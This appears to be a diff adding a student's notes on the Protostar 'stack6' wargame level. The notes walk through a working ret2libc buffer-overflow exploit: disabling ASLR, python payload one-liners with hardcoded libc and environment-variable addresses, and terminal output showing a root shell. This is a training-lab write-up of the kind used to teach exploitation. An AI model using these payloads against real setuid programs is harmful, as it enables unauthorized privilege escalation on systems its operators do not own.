@@ -1,0 +1,48 @@
+Temporarily disable ASLR:
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+Compile with no stak protector:
+gcc -fno-stack-protector -o stack6 stack6.c
+
+Dump cores:
+echo 2 >/proc/sys/fs/suid_dumpable
+
+
+------------
+Ret2LibC   |
+------------
+http://www.win.tue.nl/~aeb/linux/hh/hh-10.html  (section 10.4)
+Performing a ret2libc Attack - Defeating a non-executable stack (InVoLuNTaRy)
+
+Payload: |"A" * 80| exit() address | system() address | ENV var address |
+
+user@protostar:~$ export TEST=whoami
+user@protostar:~$ cd /opt/protostar/bin/
+user@protostar:/opt/protostar/bin$ /home/user/getenvaddr TEST ./stack6 
+TEST will be at 0xbfffff88
+user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\x88\xff\xff\xbf"' | ./stack6 
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췈���
+root
+user@protostar:/opt/protostar/bin$ 
+
+
+
+Method 1)
+- will execute system("env var") then exit(). 
+- system("/bin/sh") not working because bash drops priviledges (man bash)
+- use a shellcode instead to exec /bin/sh. 
+- use one with stdin reopen: http://www.exploit-db.com/exploits/13357/ and compile to ~/fav
+
+user@protostar:/opt/protostar/bin$ export TEST="/home/user/fav"
+user@protostar:/opt/protostar/bin$ /home/user/getenvaddr TEST ./stack6 TEST will be at 0xbfffff80
+user@protostar:/opt/protostar/bin$ python -c 'print "A" * 80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\x80\xff\xff\xbf"' | ./stack6 
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
+# id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+# whoami
+root
+# 
+
+Method 2)
+- instead of fav use other binary (to open a network socket, etc...)
+
